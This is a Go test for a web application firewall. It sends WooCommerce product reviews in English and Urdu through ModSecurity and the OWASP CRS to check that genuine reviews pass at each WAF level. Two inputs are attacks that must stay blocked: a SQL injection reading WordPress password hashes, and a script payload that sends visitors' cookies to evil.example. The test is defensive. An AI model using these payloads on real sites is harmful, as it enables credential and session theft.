package waf

import (
	"os"
	"testing"
)

// TestWooReviewWithCRS sends WooCommerce product reviews, as a browser
// posts them to wp-comments-post.php, through Apache, ModSecurity, the
// OWASP CRS and our rules at every WAF level.
func TestWooReviewWithCRS(t *testing.T) {
	src := os.Getenv("XG_CRS_DIR")
	if src == "" {
		t.Skip("set XG_CRS_DIR to an OWASP CRS 4 checkout")
	}
	form := "application/x-www-form-urlencoded"
	review := func(text string) string {
		return "rating=5&comment=" + urlEncode(text) + "&author=" + urlEncode("Ayesha Khan") + "&email=ayesha.k%40gmail.com" +
			"&wp-comment-cookies-consent=yes&submit=Submit&comment_post_ID=4123&comment_parent=0"
	}
	page := "https://www.shop.example.com/product/janan-by-marscents-long-lasting-unisex-fragrance/"
	browser := []string{
		"Referer: " + page,
		"Origin: https://www.shop.example.com",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		"Accept-Language: en-US,en;q=0.9,ur;q=0.8",
		`Cookie: sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-10-03%2011%3A40%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.shop.example.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-10-03%2011%3A40%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.shop.example.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.shop.example.com%2Fproduct%2Fjanan%2F; woocommerce_items_in_cart=1; woocommerce_cart_hash=7d2c1f0e8b; wp_woocommerce_session_0f1e2d3c=t_8a7b6c5d4e%7C%7C1759600000%7C%7C1759596400%7C%7Cabc123def456; _ga=GA1.1.123.456; _fbp=fb.1.1759490000000.123456789`,
	}
	cf := append(append([]string{}, browser...), "CF-Connecting-IP: 39.50.12.34", "X-Forwarded-For: 39.50.12.34", "CF-Ray: 8c1d2e3f4a5b6c7d-KHI", "CF-Visitor: {\"scheme\":\"https\"}", "CDN-Loop: cloudflare")
	texts := []string{
		"Amazing fragrance, long lasting!! Will order again.",
		"It's the best perfume I've used - lasts 8-10 hours, don't miss it :)",
		"Bohat acha perfume hai, quality 10/10 aur packing bhi zabardast. Shukriya Mars Scents!",
		"بہت اچھی خوشبو ہے، پورا دن رہتی ہے 👍❤️",
		"Ordered 2 bottles (50ml & 100ml); delivery in 3 days. Price = Rs. 2,500/- worth it <3",
		"Smell is \"sweet + woody\" -- similar to Aventus; select it if you like strong scents. 5/5",
		"I was confused about which one to order, then I chose Janan. Best decision! #marscents",
		"Visit https://www.instagram.com/marscents for more, really nice!",
	}
	m := crsManager(t, src, `{"waf":{"enabled":true,"level":"low","wordpress":true,"generic":true,"bad_bots":true}}`, "off", nil)
	for _, level := range []string{"low", "normal", "strict"} {
		m.Settings.Patch([]byte(`{"waf":{"level":"` + level + `"}}`))
		if err := m.Apply(); err != nil {
			t.Fatal(err)
		}
		waitApache()
		for i, text := range texts {
			for _, h := range [][]string{browser, cf} {
				if got := sendBody(t, "www.shop.example.com", "POST", "/wp-comments-post.php", form, review(text), h...); got == 403 || got == 0 {
					t.Errorf("level %s: review %d (%s) got %d (cloudflare headers: %v)", level, i, text, got, len(h) > len(browser))
				}
			}
		}
		// A real SQL injection in another field and script in a review stay blocked.
		if got := sendBody(t, "www.shop.example.com", "POST", "/wp-comments-post.php", form, "comment=nice&comment_post_ID="+urlEncode("1 union select user_pass from wp_users-- -"), browser...); got != 403 {
			t.Errorf("level %s: SQL injection in comment_post_ID got %d", level, got)
		}
		if got := sendBody(t, "www.shop.example.com", "POST", "/wp-comments-post.php", form, review(`great <script>document.location="https://evil.example/?c="+document.cookie</script>`), browser...); got != 403 {
			t.Errorf("level %s: script in a review got %d", level, got)
		}
		// The redirect back to the product page with the review anchor.
		if got := sendBody(t, "www.shop.example.com", "GET", "/product/janan-by-marscents-long-lasting-unisex-fragrance/?unapproved=91&moderation-hash=8f14e45fceea167a5a36dedd4bea2543#comment-91", "", "", browser...); got == 403 {
			t.Errorf("level %s: redirect back after a review got 403", level)
		}
	}
}
